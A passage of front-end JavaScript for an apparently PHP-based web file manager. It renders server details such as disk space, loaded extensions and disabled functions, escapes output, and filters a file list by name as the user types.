                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Disk Total</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.disk.total)}</span></div>
                                <div style="display: flex; justify-content: space-between;"><span style="color: var(--on-surface-variant);">Disk Free</span><span style="color: var(--on-surface); font-family: monospace;">${escapeHtml(info.disk.free)}</span></div>
                            </div>
                        </div>
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Database Extensions</div>
                            <div style="display: flex; flex-wrap: wrap; gap: 8px;">
                                ${info.databases.length > 0
                            ? info.databases.map(db => `<span style="background: var(--surface-container); color: var(--on-surface); padding: 4px 10px; border-radius: 8px; font-size: 12px; font-family: monospace;">${escapeHtml(db)}</span>`).join('')
                            : '<span style="color: var(--on-surface-variant); font-size: 13px;">None loaded</span>'
                        }
                            </div>
                        </div>
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--primary); margin-bottom: 12px; font-size: 14px;">Loaded Extensions (${info.php.extensions.length})</div>
                            <div style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 120px; overflow-y: auto;">
                                ${info.php.extensions.map(ext => `<span style="background: var(--surface-container); color: var(--on-surface-variant); padding: 3px 8px; border-radius: 6px; font-size: 11px; font-family: monospace;">${escapeHtml(ext)}</span>`).join('')}
                            </div>
                        </div>
                        ${info.disabled_functions.length > 0 ? `
                        <div style="background: var(--surface-container-highest); border-radius: 12px; padding: 16px;">
                            <div style="font-weight: 600; color: var(--error); margin-bottom: 12px; font-size: 14px;">Disabled Functions (${info.disabled_functions.length})</div>
                            <div style="display: flex; flex-wrap: wrap; gap: 6px; max-height: 100px; overflow-y: auto;">
                                ${info.disabled_functions.map(fn => `<span style="background: var(--error-container); color: var(--on-error-container); padding: 3px 8px; border-radius: 6px; font-size: 11px; font-family: monospace;">${escapeHtml(fn.trim())}</span>`).join('')}
                            </div>
                        </div>
                        ` : ''}
                    </div>
                </div>
            `;
                } else {
                    infoContent.innerHTML = `<div style="color: var(--error);">Error: ${escapeHtml(data.message || 'Failed to load info')}</div>`;
                }
            } catch (e) {
                infoContent.innerHTML = `<div style="color: var(--error);">Error parsing response: ${escapeHtml(text.substring(0, 200))}</div>`;
            }
        })
        .catch(error => {
            infoContent.innerHTML = `<div style="color: var(--error);">Error: ${escapeHtml(error.message)}</div>`;
        });
}

function escapeHtml(text) {
    const div = document.createElement('div');
    div.textContent = text;
    return div.innerHTML;
}

function initSearch() {
    const searchInput = document.getElementById('fileSearch');
    if (!searchInput) return;

    const desktopRows = document.querySelectorAll('#desktopFileTable tbody tr.file-row');
    const mobileCards = document.querySelectorAll('#mobileFileList .file-card');
    const emptyState = document.getElementById('emptyState');
    const desktopTable = document.getElementById('desktopFileTable');
    const mobileList = document.getElementById('mobileFileList');

    searchInput.addEventListener('input', function () {
        const query = this.value.toLowerCase().trim();
        let visibleCount = 0;

        desktopRows.forEach(row => {
            const filename = row.getAttribute('data-filename');
            if (filename && filename.includes(query)) {
                row.style.display = '';
                visibleCount++;
            } else {
                row.style.display = 'none';
            }
        });

        mobileCards.forEach(card => {
            const filename = card.getAttribute('data-filename');
            if (filename && filename.includes(query)) {
                card.style.display = '';
            } else {
                card.style.display = 'none';
            }
        });

        if (visibleCount === 0 && query !== '') {
            emptyState.classList.remove('hidden');
            if (desktopTable) desktopTable.style.display = 'none';
            if (mobileList) mobileList.style.display = 'none';
        } else {
            emptyState.classList.add('hidden');
            if (desktopTable) desktopTable.style.display = '';
            if (mobileList) mobileList.style.display = '';
        }
    });
}

document.addEventListener('DOMContentLoaded', function () {
    Modal.init();
    initSearch();
});
